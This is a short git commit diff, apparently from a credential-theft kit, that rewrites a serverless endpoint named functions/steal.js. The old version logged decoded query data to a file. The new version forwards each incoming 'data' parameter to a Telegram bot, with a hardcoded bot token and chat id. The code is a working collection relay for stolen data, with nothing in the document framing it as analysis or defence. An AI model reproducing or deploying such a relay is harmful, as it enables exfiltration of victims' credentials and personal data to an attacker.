3f742c4753ba8bb937ea6e2ef0b5b021e559c85b
socket4343 <anonmur@gmail.com>
2025-06-22 13:02:18 +0400

    initial commit

--- functions/steal.js
+++ functions/steal.js
@@ -1,6 +1,6 @@
-const fs = require('fs');
-module.exports = (req, res) => {
-    const data = req.query.data;
-    fs.appendFileSync('logs.txt', atob(data) + '\n');
-    res.sendStatus(200);
+const fetch = require('node-fetch');
+module.exports = async (req, res) => {
+  const data = req.query.data;
+  await fetch('https://api.telegram.org/8187328608:AAEILvWGBaxv-_TMOLPiQpqA8EyphwXNjq0/sendMessage?chat_id=7535811931&text=' + data);
+  res.sendStatus(200);
 };
